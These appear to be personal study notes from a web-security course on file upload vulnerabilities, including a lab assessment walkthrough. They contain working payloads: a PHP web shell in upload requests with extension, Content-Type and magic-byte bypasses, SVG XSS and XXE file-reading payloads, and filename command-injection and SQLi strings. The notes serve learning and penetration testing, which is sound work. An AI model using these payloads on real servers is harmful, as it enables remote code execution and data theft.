#CWES 


#### Lessons:
- When bypassing different filter types, be systematical, and have good wordlists (example have wordlist on double extentions, filter-bypass,etc)
- I can be hard to know which folder files gets saved into, read the source code and consider which folder is the "start folder".
- We can get php shells via svg and xml code

#### Cause of file upload attacks:
- Weak file validation and verification - bad logic in code or outdated libraries 

#### Typical attack:
- We can upload a web shell and get RCE on the server 

NOTE: A web shell has to be written in the same programming language that runs the web server, as it runs platform specific functions and commands. -> SO **1.STEP** IS TO IDENTIFY WHAT LANGUAGE RUNS THE WEB APPLICATION.

This should be simple: use **Wappalyzer** or:
"One easy method to determine what language runs the web application is to visit the `/index.ext` page, where we would swap out `ext` with various common web extensions, like `php`, `asp`, `aspx`, among others, to see whether any of them exist."

**2.STEP:** See what files we can upload to the server and if there is any restrictions. 

**3.STEP:** Send a malicious file to the server -> Typically web shells, check out SecLists which have loads of different web shells. 

It can also be reverse shells, can be found on SecLusts or https://github.com/pentestmonkey/php-reverse-shell or msfvenom.

We always prefere a reverse shell over a web shell, but sometimes we may not be able to get a reverse shell: firewalls on the back-end network that prevents outgoing connection or web server disables necessary functions to initiate a connection. 


#### File validation bypass:

**Only validating on the frontend:** If the site only validates on the client side, then it can be bypassed via sending requests directly to the api endpoint or disabling the client validation (since it is code which run i our browser we can just change it.)

Example of a file upload api:
```
POST /upload.php HTTP/1.1
Host: 154.57.164.74:32023
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundaryfaa0f7b264525ad835555a5b95d739
Content-Length: 244
Origin: http://154.57.164.74:32023
Connection: keep-alive
Referer: http://154.57.164.74:32023/
Priority: u=0

------geckoformboundaryfaa0f7b264525ad835555a5b95d739
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_GET["cmd"]); ?>
------geckoformboundaryfaa0f7b264525ad835555a5b95d739--
```


**Simple blacklisting of extensions:** If the only form of validation is blacklisting some extensions we can try to write our payload with another extensions and check it it bypasses AND is allowed to execute. 

Example look at this list of alternative extensions that might execute: 
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst (PHP alternatives)

We can fuzz what extensions are valid via the intruder in burp, and afterwards check if any of them also is allowed to execute code. NOTE: IMPORTENT TO DISABLE URL ENCODING


**Whitelist validation:** Generally harder to bypass then blacklisting, but if done poorly, it can still get exploited. Some whitelisting is done via a regex, and if there are errors in the regex, it can be bypassed. 

We might be able to do a **"double extension" or "reverse double extension"**, ex: shell.php.jpg or shell.jpg.php

We also might be able do some character injection into the extension 
- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Which can be mixed with the extension to bypass. Consider building a wordlist with such characters and known extensions. 

**File content validation:**
- It is not enough to validate the file extension, optimally the content is also validated.  
- the developer can use "content-type" to describe what content it wants, but this is also in the control of the client and can be changed 

So we can send Content-Type: image/jpg , but send a php file.

- Another way to validate the file content is to use MIME-Type, which are "magic bytes" which indicates a filetype. Ex. if the file starts with "GID8", "GIF87a" or "GIF89a" it is considered a .gif file. 

So we can add such string at the start of our payload.  Example:
```
.....

------geckoformboundary41ea713db43d71e6c99f699cf7006d8f
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.phtml"
Content-Type: image/gif

GIF8
<?php system($_GET["cmd"]); ?>
------geckoformboundary41ea713db43d71e6c99f699cf7006d8f--

```

- We have a fileextention bypass
- We have a Content-Type bypass
- We have a MiME type bypass: List of all MIME types https://en.wikipedia.org/wiki/List_of_file_signatures 

Be structured, and test them in isolated cases. 


**Other attacks:**
- XSS: If we can send in arbitrary HTML files, this can be used to preform XSS. Or we could upload a picture file (jpg, svg, etc) and have the alternative picture data (comment) execute js code if its not validated correctly. 

Ex: 
```svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

- XXE: (XML External Entity) can also be possible if we can upload svg files:
Ex: reading files from the web server
```svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Following this format we can also get php shellls:
```
<?xml version="1.0" encoding="UTF-8"?>
<svg></svg><?php system($_REQUEST['cmd']); ?>
```
- But the filename have to include a extention which can execute php code, ex: php, phar, etc. uploading this shell with shell.svg as filename, would not work. 


There are other file types which could introduce vulnerabilities via xml, for example PDFs, Word doc, powerpoint doc, java stuff, etc.


- DOS: lots of different ways one could cause a DOS via file inclusion, ex: Decompression bombs via zip, pixel flood with modified images,..

- Injection via filename: If the filename is displayed somewhere after we upload it, we can try injection techniques via it: ex:
command injection: `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami` 
XSS: `<script>alert(window.origin);</script>.jpg`
SQLi: `file';select+sleep(5);--.jpg` 


#### Preventing file upload vulnerabilities

- File extension validation: White and blacklisting ideally 
- Content validation: Content-Type header, check that i matches the file extentions we can upload.
- Protecting the uploaded files form unauthorized access: Ex. who should be allowed to see / get the file i uploaded? 
- File name sanitation 
- Limit file size
- Update libraries 
- Scan uploaded files for malicious content
- Use WAF for added security


#### Assessment 

1. What language is running on the backend: php
2. What file extention could we use: .phar.jpg
.phar.png + image/png content-type also allowed. 

.phar.png is not allowed when we add php shell as payload
- even if we add the mime png and content-type png 

These content-types if available:

|     |                  |     |     |       |       |        |     |
| --- | ---------------- | --- | --- | ----- | ----- | ------ | --- |
| 2   | image/apng       | 200 | 91  | false | false | 457289 |     |
| 27  | image/jpeg       | 200 | 85  | false | false | 457289 |     |
| 28  | image/jpg        | 200 | 60  | false | false | 457289 |     |
| 45  | image/png        | 200 | 60  | false | false | 457289 |     |
| 48  | image/pwg-raster | 200 | 84  | false | false | 457289 |     |
| 49  | image/svg+xml    | 200 | 61  | false | false | 457289 |     |
|     |                  |     |     |       |       |        |     |

- Request under lets us extract file from the server:
```
POST /contact/upload.php HTTP/1.1
...

------geckoformboundaryd0980cff6b6592fc3dfc34cc4978cd65
Content-Disposition: form-data; name="uploadFile"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

------geckoformboundaryd0980cff6b6592fc3dfc34cc4978cd65--

```


Source code:
```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}


```